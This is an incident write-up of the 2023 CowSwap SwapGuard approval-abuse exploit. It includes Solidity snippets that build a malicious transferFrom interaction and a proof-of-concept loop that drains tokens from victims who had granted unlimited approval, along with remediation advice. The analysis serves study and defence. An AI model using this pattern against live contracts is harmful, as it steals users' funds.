# CowSwap — SwapGuard Unlimited Approval Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-07 |
| **Protocol** | CowSwap |
| **Chain** | Ethereum |
| **Loss** | Unknown (multiple users affected) |
| **Attacker** | MEV bot |
| **Attack Tx** | [0x90b46860...](https://etherscan.io/tx/0x90b468608fbcc7faef46502b198471311baca3baab49242a4a85b73d4924379b) |
| **Vulnerable Contract** | CowSwap SwapGuard (settlement contract) |
| **Root Cause** | Unlimited token approvals granted to the SwapGuard contract could be drained via malicious interactions |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/CowSwap_exp.sol) |

---
## 1. Vulnerability Overview

Some CowSwap users had granted unlimited token approvals to the SwapGuard contract (CowSwap settlement). An attacker was able to pass arbitrary interactions through the `SwapGuard.envelope()` function to withdraw victims' approved tokens. This was not a vulnerability in the CowSwap protocol itself, but rather an exploitation of the protocol's broad approval structure.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable structure: SwapGuard allows arbitrary call execution
interface SwapGuard {
    struct Data {
        address target;
        uint256 value;
        bytes callData;
    }

    function envelope(Data[] calldata interactions) external;
    // ❌ interactions can contain arbitrary target and callData
    // If a user grants unlimited approval to SwapGuard, malicious withdrawal is possible
}

// Malicious interaction constructed by the attacker
Data[] memory maliciousInteractions = new Data[](1);
maliciousInteractions[0] = Data({
    target: address(victimToken),
    value: 0,
    // ❌ Transfer tokens using the victim's existing approval
    callData: abi.encodeWithSelector(
        IERC20.transferFrom.selector,
        victim,
        attacker,
        victimBalance
    )
});

// ✅ Fix: only execute allowed targets
function envelope(Data[] calldata interactions) external {
    for (uint i = 0; i < interactions.length; i++) {
        require(allowedTargets[interactions[i].target], "Target not allowed");
    }
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Unlimited token approvals granted to the SwapGuard contract could be drained via malicious interactions
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Confirm victim has granted unlimited approval to CowSwap SwapGuard
  │       (common DeFi usage pattern)
  │
  ├─2─▶ Call SwapGuard.envelope([malicious_interaction])
  │       interaction.target = victim token contract
  │       interaction.callData = transferFrom(victim, attacker, amount)
  │
  ├─3─▶ SwapGuard transfers tokens from victim to attacker
  │       Succeeds due to victim's existing approval
  │
  └─4─▶ Repeat attack against multiple victims
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public {
    // Prepare list of victims who have granted unlimited approval to CowSwap
    address[] memory victims = getVictimsWithApproval();

    for (uint i = 0; i < victims.length; i++) {
        // Construct malicious interaction: transfer victim's tokens to attacker
        SwapGuard.Data[] memory interactions = new SwapGuard.Data[](1);
        interactions[0] = SwapGuard.Data({
            target: address(tokenToSteal),
            value: 0,
            callData: abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                victims[i],     // victim
                address(this),  // attacker
                IERC20(tokenToSteal).allowance(victims[i], address(swapGuard))
            )
        });

        // Execute via SwapGuard → processed using victim's approval
        swapGuard.envelope(interactions);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Approval Abuse |
| **Attack Vector** | Unlimited approval + arbitrary interaction execution |
| **Impact Scope** | All CowSwap users |
| **DASP Classification** | Access Control |
| **CWE** | CWE-284: Improper Access Control |

## 6. Remediation Recommendations

1. **Allowed target whitelist**: Restrict the list of contracts executable within `envelope()`.
2. **Minimal approval guidance**: Guide users via UI to approve only the required amount instead of unlimited approvals.
3. **Interaction validation**: Block dangerous function calls such as `transferFrom` from appearing in `callData`.

## 7. Lessons Learned

- Unlimited token approvals are one of the greatest user-side risks in DeFi.
- DEX aggregators and complex settlement contracts should minimize arbitrary execution capabilities.
- MevRefund and PeckShield performed real-time analysis and issued warnings, but damage had already occurred by that point.